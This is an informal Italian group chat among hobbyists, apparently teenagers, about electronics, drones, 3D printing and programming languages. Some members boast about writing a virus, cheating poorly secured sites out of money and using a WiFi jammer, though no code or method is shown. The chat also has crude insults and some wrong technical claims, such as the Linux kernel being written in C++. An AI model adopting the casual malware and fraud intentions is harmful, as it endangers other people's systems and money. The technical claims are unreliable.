non si vede bene, ma dovrebbe essere un diodo di protezione..ma scusa, l'hai preso su amazon il raspy?
se si fattelo cambiare
Purtroppo no...
L'ho preso da RS
🤔 e non te lo cambiano in garanzia? mandagli una mail e vedi che cosa ti dicono
Dopo ci provo....
Magari però riesco a sostituire il diodo
🤔prova..tanto se è partito non ti cambia nulla
Infatti...
Mi potete mandare la foto Delle partizioni di Windows (di default)
Sto facendo un casino anche sul mio pc
ahhahahaah
A che servono?
ehm
i Floppy Disk da 3,5
since August 1981
Cosa ci fai?!
ma che cazzo ne so, Amazon me li consiglia
So cosa sono ahahahah
ne ho un mobile pieno, potrei venderli ma devo prima vedere cosa c'è dentro
ci dovrebbero essere dei software di mio padre
Io buttati tutti
In generale dico, chi compra floppy oggi?!
Amazon 
mhh...
lol
omg
OP
Ho preso 2 AtMega 32u4, quelli del video delle Rubber ducky per intenderci.
Una funziona correttamente, l'altra no.
Windows 10 non trova i driver per ATm32U4DFU.
Può darsi che  uno dei due non abbia caricato il bootloader?
up
ma...ma...ma...
qua i matematici si triggherano
io non ho capito un caz perche non so cos'e lim per es. e a scuola non sappiamo ancora cosa significa infinity + 1
infinito + 1 == infinito ._.
si ma non ce sensooooooooooooo
e lim è limitante
why not?
tipo while(1){i++ = i + 1;} non credo che qualcuno farebbe una cosa del genere ..
cos...perchè, cosa stai dicendo, cosa centra la programmazione
e poi i++ = i+1; non vuol dire niente
appunto
non è un'istruzione del c++, ma dire i++ e dire i+1 è quasi la stessa cosa
è come scrivere while true : true;
lo so. ma infinity + 1 = infinity e la stessa cosa XD credo
Vero
no...sono cose diverse
Avrebbe dovuto dire f(x)²
Che essendo al quadrato tenderà più velocemente ad ∞ di f(x)
si beh... sempre ∞ è, e ∞ +1 = ∞ , quindi in genere non c'è nulla al di sopra di ciò che ha scritto quell'altro
non sempre. se f(x) > 0 & f(x) < 1 sara altro
a meno che non dici "∞ dei razionali" specificando
Cos
che poi  anche il mezzo tra 0 e 1 e ∞
È un infinito più grande
Nei limiti gli infiniti più lenti non vengono considerati, si prende solo quello più veloce
ma sempre numeri irraggiungibili sono
matematica cosa strana ma bella cmq 
btw, ∞ +1= ∞  e ha senso
Mhhh
Mmmh
Inf non è un numero
Non puoi trattarlo così
ecc, stavo per dirlo
il senso e quell'espresione  io penso che se ∞ si ingrandisce sempre non ce senso
si...è proprio perchè è un numero irraggiungibile che quell'espressione ha senso in realtà
 la lumix è di seconda mano o è nuova?
vab ci pensero per capire ma ∞ resta pursempre una cosa spaventosa sempre. Non immagino mai come qualcosa non puo avere una fine.
 hai cambiato macchina e hai preso una lumix?
È di Tom's Hardware

Infatti Mi sembrava già usata dalla plastica superiore 
Comunque secondo me il tipo dello screen l'ha inteso così

(Lim f(x) con x –> ∞) + 1
Se uso l’amplificatore del microfono?
Quindi sì ha più senso
 Vedo che hai ascoltato la mia richiesta... Ora manca solo il Dolby Digital 5.1
basta che amplifichi il segnale prima che arrivi a destinazione
 4k a 25fps, boonoo
Cos ma perché tagghi gli admin??
basta anche un amplificatore a transistor classe A o qualsiasi amplificatore che vuoi
Copiato
Volevo taggare romboli, mi son sbagliato, Sorry
Gh5s?
Lol
cosa
Lascia stare ho parlato al vhf fino ad ora stavo in mare
ti capisco
Di dove sei?
Nono è così leopardata
Io sono di Termoli in Molise, ma oggi ero ad Ortona
Poco a sud di Pescara
..dai che quel screen ho trovato chiamato "totally ignorant" quindi c'è  ignoranza xD non faccio spam cmq
Conosco uno di Termoli
Di dove sei te ?
Fondi (Latina)
Capito

Si chiama " "
Ah -.-
Comunque in realtà è di Tom's Hardware 
La privacy non esiste più eh...
“Togli”
Cos'è sta roba 
Brutto iPhone
12 o 16 anni?
15 xD
Volevo far notare L’ F35 sulla torta
Ti giuro non ho notato
Cmq auguri
Thx
eccolo 
Perché c'è un f35 sulla torta
Perché non dovrebbe esserci ?
Ê corretto
Komunque auguri tizio sconosciuto che non ho mai visto
Thx
Auguri 
Picculo
Stavo pensando
Cazzo io 15 anni già li ho compiuti
Pure parecchio tempo fa
Un convertitore da word a pdf?
emmhh...andare su "export" e "create PDF/XPS Document" no?
Sono talmente abituato a usare MAIUSC F12 che manco mi ricordavo del menu
Tanke
gg
Ctrl-S
Minchia oh ma perché devono fare tutte le cose al contrario? Tutto il mondo usa ctrl-s per salvare tranne office e il blocco note
Ma sai che anch'io mi trovo scomodo
EH
ahahhaa
Ce ctrl s che schifo
TU HERETICO
No, in word SOTTOLINEA
Ah, ovviamente solo in italiano
Per cui cambi lingua al computer e cambiano le scorciatoie
Quando facciamo l'unixBeer da noi a Milano ci devi essere ahah
Uhuuu
Stiamo anche tentando di organizzare un Linux Day se ti interessa
Dove?!
Milano Bicocca
Faccio un po' di pubblicità già che ci sono: per chi è interessato 

Eh? Repeat pls 
Gente qualcuno ha mai programmato un esp8266 esp01?
Se intendi come WiFi jammer io si
Trash
si
risposte
Naturalmente, sono appena tornato da una fiera
Ma checazz
(Era in risposta al messaggio " ma con queste conoscenze non hai una vita sociale?")
Ti amo
Almeno dillo a me sono un tuo fan
Omg
Fai un desktop per i programmi che utilizzi spesso ma non vuoi metterli nel desktop del pc perché  fanno spazio.non so se è  complicato ma so che con c++ puoi farlo
Ma sarebbe inutile...
E poi troppo poco innovativo...
Ah vero non fai per te..
FAI UN VIRUS
Una delle cose che sto sviluppando ultimamente per tutti i device è una chat che permette di mandare messaggi in html 5
Fai un prog che inganna i siti mal protetti che danno soldi e lavora quei soldi
(Immagina le potenzialità)
Coglionate, tutti sono vulnerabili, o almeno la maggior parte, il problema rimane l'anonimato e dove depositare
Eh non sono bravo in nessun linguaggio purtroppo,non posso immaginare ahhaha cmq so un ragazzo come te,è  un pro di web development e lavora nel freelance .-. Faccio il tifo per voi
So già come risolvere questi problemi, ma al momento non mi servono soldi,
Vorrei solo un pò di fama ultimamente, tutto qui
Dopo la chat lavoro ad un virus fatto bene
Ti amo
(Ma non le solite cazzate)

Mandamelo,lo aprirò,ma almeno restero con tanti emozioni
Ehm...
No
Ciò che voglio fare non devi aprirlo
Basterà riceverlo...
( Ma non ti dirò mai come worka)
Oh may Goooooouddddd
Non è  che se mi dici capirò
Va beh che è mooolto più complicato da spiegare.
Io ho 15 anni,dimmi se sei 2 o più volte piu grande o meno,pliz
Stiamo lì con la mia età dai.
Sono molto incuriosito mr
Almeno dimmi se hai imparato tutto da solo,sono moooolto curioso
Si, da solo
Gli insegnanti qui mi fanno pena
Anche se alcuni(ahimè davvero pochi) sono bravi
Ti capisco da morire
Good, WebSockets?
L'altro giorno ho fatto un logo per una persona, e ho usato una versione modificata di un(a) font che si chiama Anurati, perché é free per uso commerciale.
Poco fa vado su La7 e in alto a sinistra c'era l'annuncio di un programma. Il logo era fatto in Anurati. Sono dei geni a La7, hanno fatto un logo figo (perchè il font è una gran figata) senza spendere un centesimo.
io avevo provato a fare una chat in c++ un tempo...e funzionava :D ma, appena provavo a metterci il multi threading per far si che chi vuole può inviare un messaggio quando vuole, tutto si sfotteva e smetteva di andare ._.
ma perchè mettersi a fare virus è futile
fieri
però la soddisfazione che viene quando lo hai fatto, almeno questo succederebbe a me, ti senti un vero cracer
beh è molto più soddisfacente fare un programma utile che funzioni o qualche strafigata di progettino con rasp e altra mmmerda in cui ci hai buttato tanto tempo per scriverne i codici in più linguaggi...e poi lo puoi usare, un virus che cazz te ne fai, manco lo puoi testare
beh ognuno ha i suoi gusti, a me gaserebbe un botto fare un virus, non so perchè
io ho appena finito la seconda serie di rick e morty...ora programmo per il resto della notte, devo imparare il php, so che potrebbe sembrare autolesionismo ma è perchè d'estate devo andare a lavorare dalla mia prof e li quello si fa
ma magari mi salvo col js
Avrei due "cavolo" da buttare lì: 1. cavolo php! 2. cavolo l'estate a lavorare con la tua prof!
Sostituiscili con 2 bestemmie e siamo apposto 

hey, quando sono andato a fare richiesta di scuola-lavoro li non sapevo il secondo titolare fosse la mia prof, e poi non pensavo avrei dovuto programmare in php
oltretutto viene un altro della mia classe giusto per darmi sostegno...nel senso che se tutto va bene finisce come ad autocad che passa il tempo a staccarmi la spina al pc ._.
Digli: PHP È UNA MERDA FATEMI FARE IL FRONT END
magari ti ascolta
vado a scrivere i css
GG e buone bestemmie
se tutto va bene riesco a schivare il php e farò js e jquery assieme alla prof e via, lascio il php al mio compagno
È figo il php
bene, vieni qua e aiutami allora
ma prima il jquery
Ban
Dica
prima jquery ho detto (devo preservare la mia salute mentale ancora un po')
Ahahah
devo preoccuparmi?
Nahhh
E invece sì 
ti capisco
non ci sto capendo nulla
Cioè, lo so il PHP, mannaggia mia, ma fa schifo da quando ho scoperto altri Framework
Nah, ci si guadagna molto, anche tanta fama.
Ma il php è bello
Perché lo discriminate ?
Secondo me è meglio sviluppare Web App a pagamento
Io ho fatto varie cose ma poi mi scontro sempre con i framework che non ho mai fatto funzionare... Troppo complicato, ma probabilmente mi manca qualcosa per capire il funzionamento e allora vado di codice PHP puro. Funzioni fatte da me e qualche classe per essere d'aiuto, query tutto a mano e funziona ma ci vogliono i secolo per fare qualsiasi cosa e sento sempre parlare di framework qui e framework li...
Lol
“Ci guadagni fama” eyyy siamo nel mondo reale qua
Ahahhahaha ma nte vergogni
Di Cosa?
Parla italiano e poi puoi insultare grazie
Shhh
Che cazzo di fama ci devi guadagnare
Cazzo manco toppetignao
Preferisco dire cosa sto creando dopo che sarà concluso, ma se riesce, vale non poco.
Comunque, che hai contro di Me?
Madò, sta gente a cui piace flammare...
È bello criticare quando non sai quanto cazzo di lavoro ci sta.
E dopo che ci fai?
Ci h4ck3r1 le persone? 
Dipende...
Sarebbe facile, molto, se riesce.
Ma come ho detto voglio parlarne solo dopo concluso.
Almeno vendilo
Avrebbe più senso
Shhhh
Invece di rubare le foto delle vacanze alla gente
Quello è obv
Comunque ciao
Mi scuso per aver alzato un polverone, volevo solo chiedere un idea per un progetto...
Ok, notte
Scappate?
Ehm no..
Ho un sonno boia, soprattutto dopo aver fatto cose che non posso citare( non al computer)...
Notte

Benvenuto (o benvenuta?) 
Benvenuto
ah ok
Il nome vivi sta per vincent
Lol
che ultimamente non si sa mai, meglio non rischiare
A te ti stimo.
uuh, figo
Va beh, notte
Concordo
Ahaha
Buonasera
Benvenuto!
Come si chiama il canale youtube?
Vivi-ncere e vinceremo

overVolt?
Se ti fai una sega non puoi dire di aver scopato...
Grazie
Sora!
Rekt
Ehm...*non insultare!!!*
Ho la ragazza *non rinfacciare!!!*
Non ho scritto nulla...
Tu sei degno di stima.
Da come parli avrai si e no 14-15 anni
Rekt x2
A 14-15 anni che vorresti fare...
Sentiamo
La bibbia già esiste...
Inutile che scrivi molto
Lol
Pensala come vuoi.
Credi quanti anni vuoi che io abbia per insultare in modo così conformista alla massa ovale solo per sentirti dentro il tuo ego del cazzo meno idiota☺️
(Non mi piace flammare, ma chi ferisce di spada, di spada perisce☺️.)
Si ma state calmi
IO STO MORENDO LOL
Meglio avere un ego idiota che essere una persona del cazzo che se la crede tanto come te
...
Attento che ti hackera
Madonna, non dico la mia età per rimanere anonimo xd
Pensala come vuoi
Ok mo' calmi però
Come se fossi l'unico ad avere 15 anni
Lol
Gente, basta
Siamo in due lol
Che non voglio mettermi a stermknare gentw
Grazie a dio.
Ma si stava facendo divertente:(
*divertire...
Coosss
Però mi stavo divertendo
Ma lol
Non ho nulla da fare
a sfottere gente alle spalle?
"Ego idiota"
Sono occupato a rushare i loud su payday, non voglio bannare gente ora, non ho tempo
Ma sa parlare?
Stavo osservando il flame lol
Analfabetismo intensifies lool
Sa il significato?
Sono una persona occupata io
Va beh,  notte
Se l'hai detto tu
Pensala come vuoi.
Credi quanti anni vuoi che io abbia per insultare in modo così conformista alla massa ovale solo per sentirti dentro il tuo ego del cazzo meno idiota☺️
Impara l'italiano, e non le stronzate che dici tu
Leggi qui
Si, ma "Ego idiota" no cazzo.
Casomai "Ego da idiota"
Oltre che ad essere scemo sei anche cieco tra l'altro?
Hai detto ego del cazzo 
È peggio semmai ahahahah
Se Se, va beh
Devo cominciare a bannare tutte le persone appena entrate da ignuranza o la finiamo di insultarci?
Lol
Io non ho mai voluto insultare
Ma mi sto divertendo, chiudetelo un'occhio ogni tanto dai
Leggi se puoi
sisi ho letto
Che admin siete altrimenti
ma che c'entra
Sera
Sono ironico infatti
Weee
Questa si chiama pazzia.
Bipolarismo
mi rompe vedere persone che si insutano e poi sfottono in altri gruppi
Va beh, notte
e 4 
Mi scusi...
Infatti
 c6?
Parla per te
Ti devo chiedere una cosa
C4
Si
Beh veramente stiamo fottendo il tipo che fa cose segrete terribili al computer, non il gruppo
Tu non ti divertiresti a prendere per culo uno che si ci fa prendere?
Ma zitto merdina
Ma per fare un pezzo tutto pieno con anet dove và settato?
Boom
Va beh, notte
Sono già 3 volte che devi andare a letto
E 5 cazzo, Oscar ma zitto.
Ancora non vai
eh cosa ho detto io
Quà?
Vai a dormire che è tardi
Yep, mettendolo a 100 lo impiena...ma vuol dire taaanto tempo, con l'abs un 40% è indistruttibile, al 100 non serve quasi mai
E un pezzo piccolo  sé metto 20% fà i vuoti
Con i piccoli allora si, usa il 100
Ma non so a quanto serva
È taanto fino come coso...mi fa paura
Finalmente il bimbo è andato a dormire
Pero ho notato che il tempo e sempre quello può essere 🤔
E allora mi sa che non cambia sai...
Ma non hai un cazzo di meglio da fare?
e basta, pure tu
Perché
Comunque, ora sto parlando con il founder di un canale 20k per una cosa.(perciò sono online...)
Troppo piccolo, non ci sta proprio lo spazio per l'infill
Ok, quindi il software decide sè riuscire ?
Lol
Ho visto un 
?
Semplicemente l'infill inizia dopo un po' ma li non essensoxi spazio è già al 100% in quel pezzetto in teoria
Quando?
Ok grazie
Che caaazz sta succedendo
è morta la mano
Cos'è sta catena
Yer
Rip mano
È morta si
L'ultimo commento di walter l'ha triggherata
ah ok ci siamo
Benvenuto inserisci il nome
Dio
Dio cosa ?
Scoiattolo
Si può blasfemare leggermente qui?
dipende cosa intendi per leggermente, ma in generale no
Ah ok... 
Non si può...
Sorry
Occhio alla mamma che poi si arrabbia  (IRONIA E SATIRA)
Art 19 e 21 della costituzione
Non hai sparato a caso ... bravo
Mea culpa articolo 21 della nostra costituzione e 19 di quella dei diritti umani
E se vai a controllare negli articoli 9 21 e 33 viene tutelato il diritto di satira come forma di espressione
 ragazzi guardate qua..ci sono delle chicche interessanti 🤔
Thank you, each and every one of the 12,000+ people who stood up to support the freedom of internet and Telegram today in central Moscow. 

Grande Durov, grande Telegram

Quante soddisfazioni il mavic **
Ma che figata sono quegli scatti a 360 
La terra è tonda allora
Esagerati!
Giuro!
Pensavo di essere l'unico online
Ma seriamente? Alle 2:30?
Giorno 
Giorgio 
E mi sveglio con il cuoricino di Shiffman 
Coosa 
Oow
Buongiorno, devo stampare una chiave della macchina come prova. Quale è il materiale che resiste di più alla torsione?
ma cazzo state litigando per nulla sto urlando
Visto che parlavate di casse, quale stoffa si può usare per fare una cassa con una spirale di materiale conduttivo e un magnete? Cioè come trovo il giusto equilibrio tra leggerezza perché possa vibrare facilmente e capacità di spostare l'aria, senza comprare un intero campionario di stoffe per provare? (domanda troppo 'da femminucce' perché c'entra la stoffa?) 
Cominciamo bene
Esatto!
AH ADESSO CHE MI DITE TERRAPIATTISTI??? EHHH?? EHHH?? 
LA TERRA È TONDA!!!!
Heretic!
La oop di PHP è qualcosa di 
Poi arriva la dependency injection e uccide tutti a colpi di xml..
Php è bello
Ci fai di tutto
Cos'è una malattia? 
Yess
Allora tu non conosci il lato negativo di PHP .-.
 fottiti
Spara
In pratica 
 per importare una libreria in PHP devi:
- creare una classe factory 

- listate tutte le classi factory in un xml
- e per importare prendere le factory dall'xml e usarle
E con questo?
E con questo è un suicidio
Ma puoi fare copia e incolla lol
?
Ahhh capito
Nei siti delle librerie spesso ci sono già gli xml fatti
L'ho usato
Eh
Ma solo per una classe
Sebbene il codice era immenso. Quindi conta anche quante classi fai e quante te ne servono.
Ovvio che se sei un cretino che crea classi su classi
Ti devi sparare
No ma dico quando tu hai più file nel tuo progetto scritti da te
Secondo le convenzioni va fatto così
In effetti da questo punto di vista
Per mantenere separati i tre livelli di lavoro
Però ey chi ha mai usato una libreria in php
Io
.-.
Nel senso che non sono essenziali
Ho usato PHP TS3 Framework per il gestionale dell'hosting
Mai provato PHP su grossi progetti quindi non so xD
Io si ma ho solo lavorato dopo averli creati
In un solo file 5'000+ righe di PHP
Poi ce ne sono diversi
Appena ho aperto il file mi si è fermato il cuore 
Ecco, questa è una cosa da non fare... xD
Perché no
Perché poi non capisci più un cazzo
Se devi modificare qualcosa non capisci più dove sta
Rip Apache
Man
Per questo si usano file separati
Non hai capito
Ma PHP ti spara se ci provi
..
Ne avremo 5 diversi
Eh
Così grossi
Dovevate dividerne ancora
Poi esiste ctrl f
Che facciamo le classi login parte una e login parte due?
Se un unico problema è risolvibile in 5000 righe non va diviso
No ma dico, potete dividere tutto in funzioni più piccole
Tipo
Evidentemente non sai PHP abbastanza bene
Il login deve vedere il DB? Allora si crea una classe con tutti i metodi del db
Con le query prefatte
E chi ti dice che non lo abbiamo fatto
E che cazzo ci dovete fare in questo fottutissimo login così tanto grosso?????
Su quel sito ci sono:

Tutti i login
Tutti i vps, dedicati e TS
Tutti i clienti con le informazioni del servizio

E altre cose a me oscure.
Dio mio
Ho fatto un esempio
È gigante
Tutti login? Bastava fare una classe in modo generico(?)
Comunque esistono package manager per PHP come Composer
Non hai capito nuovamente
Si ma usare package manager per due librerie del cappio...
Vabeh basta, non voglio più sapere xD
Quelli sono tutti i dati tenuti nei db
Poi conta le query per ficcarli e per levarli
Altrimenti finiamo dopodomani che io ormai sono fissato con il desktop developing 
Se vuoi vedere il sito è 
 così non sbatti 
O al massimo un po' di front-end
GUI?
Conta che lo stiamo facendo nuovo
? In che senso
Con schermata grafica
L'avevo capito
Ma dico che c'entra?
Con PyQT, Pygame, Tkinter... ?
Python è facile da usare per delle interfacce?
Ma boh io dico che ormai la mia mente è radicata sul desktop developing
Mhhhh dipende da che libreria usi
Chiedi a 
, lui usa PyQT
Io ho provato tkinter e non che mi abbia fatto schifo ma preferisco pyqt(che mi devo ancora studiare perbene)
Quale libreria usi?
K
Che poi alla fine io lavoro con PHP ma sono anche bravo con CSS e HTML e.e
Io e il backend siamo due rette parallele
Strano dato che il desktop developing è molto più vicino a back end che frontend
Se sai NodeJS e il FrontEnd Web Dev puoi creare App Desktop con Electron
Usando CSS come "motore grafico"?
MA È BBBELLO
Ahhh php
Esiste anche altro.
Si ma di solito in backend si usa  php
Flask, Django (Python).
Go, Rust ecc
Non vuol dire che è il migliore
No, Electron crea un istanza di Chromium dove esegue la tua pagina Web, che può accedere anche all'API di Node
In pratica per quelli fissati con i linguaggi web che non hanno voglia di impararsene uno desktop e vogliono fare programmi per desktop
ASSOLUTAMENTE NO. Node, Golang, Rust, Django, Flask, non ti dicono niente?
Atom è fatto così ._.
OK, magari non sarò ferrato come voi sul web dev ma... Atom non è un editor?
Cos
Se sei un'azienda e fai usare PHP ai tuoi dipendenti hai qualche problema
Non apre una pagina internet
Sì
Nah
Dipende da cosa devi fare
Non facciamo i bimbi raffinati
La "pagina internet" È la finestra
Ah secs
Allora imparo node cazzo
Fanculo python
:(
Ma in py ci fai tanta altra roba segs
Non se lavori da molto tempo nel settore
Convertire tutta l'infrastruttura costa tempo e denaro
Immagino per i corsi di aggiornamento
Costi di aggiornamento, riprogrammare il tutto, riprogettarlo
 nodejs è simile a js? E poi, posso crearci una specie di chat?
Si sa, ma tutto questo si può risolvere facendo usare ai propri dipendenti dall'inizio altri linguaggi più al passo coi tempi e con più performance come Golang
E nel frattempo devo continuare a lavorare su quella vecchia, mica puoi lasciarla perdere
E tutta la robba vecchia?
Mi ero cannato un "dall'inizio"
Se operano nel settore da tempo Golang forse manco esisteva 
Mettici anche che ci sono molti programmatori php sul mercato, quindi c'è concorrenza
Sono diversi fattori, ma è ovvio che una startup moderna non dovrebbe usarlo per niente
NodeJS è JavaScript Runtime
Quindi usa js per fare cose?
È JS per desktop env
(Dovrebbe)
Sì, è la stessa sintassi
Non proprio, ufficialmente è js per backend
Gira su engine V8 di google
Perchè Node utilizza JavaScript Engine v8 di Chrome
Ma progetti come Electron te lo fanno usare anche per desktop
Beh, diciamo che avere una tab di Chromium aperta a tua insaputa non è che sia molto benefico per la tua RAM
Dettagli 
Pro o air?
senza rivali!
Berlino 
Mio cugino invalido si chiama Chicago di notte :P
Buongiorno

Ovviamente il pro!
Assolutamente
Adesso sono in dubbio se prendere il pro o l'air
No la terra è piatta perche se gli aerei volano dritti poi escono fuori dalla terra
Assolutamente il pro, l'air è uno spark con le steroidi

Eh però l'air tanta roba
Se sono vegetali va bene
Meglio naturale!
Solo come dimensioni e altre 2 o 3 chicche...
Già solo il radiocomando oblitera il mavic air
Si percarita
Però anche come sensori è meglio l'air no?
Ha quelli posteriori, si. Ma a priori mi fido poco dei sensori
Ogni tanto flippano
Quindi il pianetino l'hai fatto in post
Yes, una semplice app per smartphone, il pro scarica la foto piatta (che puoi trovare sopra)
🤣🤣🤣🤣
Raga ma a che servono references and pointers nel c++?
compra un quadrato di Pile, è il più usato in questi casi
nylon è il migliore, secondo ABS
Davvero? Non avrei mai detto. Pensavo qualcosa di più leggero. Grazie, provo
guarda che esistono vari tipi di pile, non esiste soltanto quello pesante invernale..si usa tantissimo in campo car-audio per i rivestimenti
l magnete non deve stare a contatto con la stoffa, ma un minimo staccato, vero?
yes basta fare una forma a cono
eh, ma non è una cassa normale: è una spirale su stoffa, quindi tendenzialmente dovrebbe restare piatta. Pensavo di farle un piccolo telaio invisibile per mantenerla tesa, ma stavo cercando di capire come creare lo spazio per il magnete. Ci ragiono un po' e vedo
Mmm?
mhh... ora che l'ho ritrovato posso andare a lavorare alla google icsdì11!
 venghi con me
piccoli traguardi che ti fanno sempre emozionare
Esistono powerank che erogano a 5V 4A?

Vedo il bacio accademico
ma ero l'unico che era concentrato sulle due dell'alternanza e sul loro telefono?
madò
Telefono? Why?
non saprei... Ma non penso... Povere batterie
non ricordi?
il telefono
Looooool
🤦‍♂
Tanti piccoli che non si vedono ahahah
Io ricordo solo un'altra cosa
Hanno capito tutto ahahahahah
dove avevano il telefono?
non ti ricordi?
Viene calcolata come alternanza scuola lavoro? LOLLE
si
perchè le basi di qualche vero linguaggio erano troppe
ma che
L'anno prossimo vado ad insegnare i PuNtO BaT alle scuole materne
Io lo uso come sottolampada

e io i pUnTo vbesse alle elementari
faccio che acEraNo11! il registro elettronico per prendere DieShI11! oMg
🤔immagino dove non batte mai il sole, anzi solamente in estate
satto 
Sapete perché mi dice questo? Ho seguito la guida sul blog per creare applicazioni infette
Ah, allora anch'io
Non me ne ero neanche accorto del Telefono
Ero troppo concentrato
Chiappe di serie A bravo Lillo 
Nessuno ha mai seguito la lezione così attentamente
soprattutto quando aiutavano quelli di fronte

E menomale che non avevano voglia di girare il tavolo
*dieshi

Secondo voi con il pacchetto UNLIMITED PLUS si può fare una specie di cloud? 



Se c’è ftp si, ma tutti i file sarebbero pubblici
FTP c'è, ma non si può richiedere username e password??
Certo, ma resta comunque uno spazio web pubblico
Potresti bloccare da htaccess però
O una sorta di login
Anche se penso che ci sia comunque un limite di spazio
Anche
Intanto per un login Easy ci vuole pochissimo
nope
spazio illimitato e mail illimitate
e sì, basta un htaccess, come avevamo fatto per il blog
noi admin potevamo entrare mentre tutti gli altri venivano mamdati ad una pagina "welcome.html"
prova con un'altra app, magari e l'app che dà errore
Se carichi 500TB penso che si incazzino
Anche perché vanno in perdita
maa... come sei riuscito ad installare Parrot?
ah boh  mai provato
con quello che costa non penso 
500TB di hard disk costano un bel po
La nasa dio
Non occuperai mai 500tb
C’era una ragazza su questo gruppo che aveva scaricato 50TB di video degli youtuber che gli interessavano
................
Wtf
Ehy raga chi ha Kali sul PC ?
Io
Vorrei ricordare questa frase
Posso scriverti in privato ?
Eh scrivi
Ottimo per i makers 
 |
 |
V

 ‎€1‎9.‎99‎ i‎nv‎ec‎e ‎ch‎e ‎€2‎8.‎99
⚖️‎ R‎is‎pa‎rm‎i ‎il‎ 3‎1.‎05%
⭐️‎ 4‎.3‎0 ‌‎/‌‎ ‎5.‎00‎ (‎15‎2 ‎re‎ce‎ns‎io‎ni)
 

Me lo fa con spotify, telegram x e whatsapp...
Perché dovresti infettare un'applicazione?
Per fare l’anonymous
Mi linki il blog?
Per curiosità
Acherino
Quindi condividi anche i loro ideali?
Ah quello l'ha detto lui, quindi gli cedo l'onore di risponderti
Non so quali siano
Allora non puoi dire per fare anonymous
Si ok, anonymous a parte, torniamo all'acherino?
(L'errore è voluto)
Perché gli anon sono conosciuti come gruppo di hacker, ma in realtà sono un movimento che crede in certi ideali, e per raggiungerli fanno queste cose, ma non fanno a caso 
Certamente
La mia era una simpatica battuta
Lo sò tranqui
Avete delle idee per risolvere questo problema?
Però molti hanno l'errata convinzione che gli anon hanno obbiettivi a caso, quindi meglio rispondere bene 
Mi linki la guida?
Yep, arriva
Tra poco vedo
Grazie mille
devo aggiustarlo, l'ho scritto di fretta e non è uscito benissimo
Fa lo stesso errore anche con altre guide
Weeee si festeggia
Gg
Manda l'errore su hastebin
Dò un'occhiata
Dis-iscrivetevi tutti
Per 5 minuti
Giusto per fare uno skerzo zimbadigo
Cosa sono?
 Dei cappucci per i pulsanti
Raga una gtx 1080 Ti entra in un master case pro 5 (coolermaster)
Si si
Perfetto 🧐
wow
devi comprare una 1080ti?
Si
Non ti fai mancare nulla 
E da tanto che ho intenzione di comprarmene una
Drone per le riprese budget massimo 250/300
No
È solo il software de governo!!
Che storpia le immagini
Ah bello
Grazie
Xiomi Mi Drone 4k lo riesci a trovare in offerta anche a 320, oppure usato
A friends advice to solve a memory leak in my game



by 
gg
Rip
E il bello è che non è piú entrato, voleva spammare e basta 
Col referral di overVolt vero?
em.... siii

Madeline proto
non è in py
imparo sti termini
Is Your Child Texting About Programming Languages?



by 
brb = bad recursion brb(bad recusrion brb(bad recusrion brb( bad recursion X)))
brb cosa significa? 
ma cosa ti costa 
basta scrivere 10 caratteri e hai fatto
loop
lol
Dammi i pezzi di scarto papà
☺️
ragazzi qualcuno che sa a cosa servono pointers e references nel c++?
P.S. ho googlato
ho un case da buttare
ho un pentium (che non uso)
La variabile è un contenitore: i puntatori si riferiscono ai contenitori e non al contenuto
si,ma nei codici come sono utili?
(Ora, non so programmare in C)


Quando cambierà il valore di 
, cambierà anche il valore di 

&a*
ahhhhhhhh
need help
la * in *a è tipo la $ in php
qualcuno che ha FL Studio?
capitooooooo
ma al posto di contrassegnare una variabile contrassegna un puntatore
grz
Brb
brb brb brb
Yep, intendevo questo
Grazie
so un minimo di C yeeeeeeeeeee
Io non ho mai fatto C/C++
Io sto imparando c++
Fra qualche anno dovrò impararlo  e io sono abituato a strutture ad alto livello come Python
sei arrivato ai puntatori?
Fra poco faccio le classi
So cosa sono più o meno
Quindi C++
Si, ma non è il mio primo linguaggio
mah, c/c++ se sai già py o roba simile essenzialmente ce la fai, il problema eè che ti verrà scomodissimo usarlo per progetti grossi
allora hai già cominciato con le bestemmie, gg
Eh
Non li ho usati, li conosco un po’ da obj-c
Per esempio la oop di C++(principalmente l'instanziamento di oggetti) è molto differente
E poi ci sono io che imparo linguaggi e poi non li uso più e mi dimentico tutto 
ah, allora sei ancora sicuro
 Per leggere un programma fatto con i puntatori tanto vale spararsi in testa
quando gli farai seriamente inizierai a bestemmiare come un porco
.-.
Si so che a volte si usa new a volte no ma è molto vago
new serve solo per instanziare memoria dinamica
sono tutti concetti complicatissimi della gestione della memoria
quasi peggio dei puntatori
Ad esempio, io saprei leggere un programma in Java, ma non in C
io in c se mi sforzo(e non ci sono puntatori usati in maniera pesante) ce la faccio
Tu l'hai fatto a scuola C?
nop
sono in 3a media 
Per cosa è usato c?
tutto
Ah come me
Mm sono più vecchio di qualcuno allora
l'interprete di py è scritto in c
il kernel di linux è scritto in c++
In cosa è differente da c++?
windows è scritto in c++
non ha oop
Eeeh
E perché c’è gente che usa c allora
e quindi tutti i suoi metodi sono procedurali
ahahahahah cicca

Se oop sta diventando il futuro non vedo il punto
perchè oramai sono abituati da secoli a quello
Più che altro per programmi che devono risultare leggeri e performanti, visto che il linguaggio stesso è a basso livello (gli esempi possono essere il Kernel Linux, l'interprete di Python, nginx, Samba, ecc...)
C non è a basso livello anzi
se può lavorare con la memoria non vuol dire che sia di basso livello
asm è di basso livello
cobol forse
ma C/C++ no
Asm== assembler?
assembly
Ma C è relativamente a tutti gli altri un linguaggio a basso livello
Non sapevo quale dei due
no, ha una sintassi complicata(più o meno)
C++ è alticcio
ma non è a basso livello
Assembly è il linguaggio, Assembler è l'assemblatore, il programma che si occupa della traduzione
Lo so
ah scusa
È un medio livello
Amazon brevetta un sistema per tracciare gli utenti di Bitcoin

Amazon, il più grande rivenditore online al mondo, ha un nuovo brevetto riguardante i Bitcoin, la nota criptovaluta. Il brevetto utilizzerebbe la raccolta di dati per stabilire i partecipanti attivi alle transazioni di bitcoin in modo da associare ogni transazione bitcoin a un indirizzo IP, un elemento cruciale che sarebbe molto utile per l'applicazione della legge.

Bitcoin, come tutte le altre monete digitali, esiste da meno di un decennio. Tuttavia, la maggior parte delle persone ha mostrato un notevole interesse per il loro utilizzo a causa del loro anonimato. Questa caratteristica, insieme a molte altre, ha fatto diventare il bitcoin una delle principali criptovalute. Di conseguenza, viene utilizzato in molte transazioni legittime e per commercio legale, così come nel commercio illegale sul Dark Web e come moneta di riscatto nei ransomware.

